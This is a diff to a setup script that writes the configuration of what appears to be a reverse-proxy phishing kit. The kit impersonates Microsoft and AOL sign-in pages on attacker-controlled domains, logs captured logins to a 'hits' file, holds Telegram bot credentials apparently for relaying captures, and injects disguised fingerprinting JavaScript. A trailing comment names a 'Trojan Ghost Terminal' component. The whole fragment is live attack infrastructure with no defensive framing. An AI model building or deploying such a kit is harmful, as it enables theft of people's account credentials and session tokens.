@@ -110,15 +110,15 @@ cat << EOF > /root/config.json
   "proxyDomain": "$USER_DOMAIN",
   "listeningAddress": "0.0.0.0",
   "listeningPortHTTPS": 443,
-  "listeningPortHTTP": 80,
   "target": "login.microsoftonline.com",
   "log": "/root/hits.json",
   "telegramToken": "$TG_TOKEN",
   "telegramChatId": "$TG_ID",
   "cfToken": "$CF_TOKEN",
+  "cert": "/root/cert.pem",
+  "key": "/root/key.pem",
+  "target": "login.microsoftonline.com",
   "injectJs": "/var/www/adobe_gui/js/akamai_fingerprint.js",
-  "slug": "$USER_SLUG",
-  "headerRules": [ { "name": "X-Trojan-Edge", "value": "true" } ],
   "proxyRules": [
     {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
     {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
@@ -129,6 +129,8 @@ cat << EOF > /root/config.json
     {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
   ]
 }
+
+
 EOF
 
 # --- 7. TROJAN GHOST TERMINAL (RUN.SH) ---
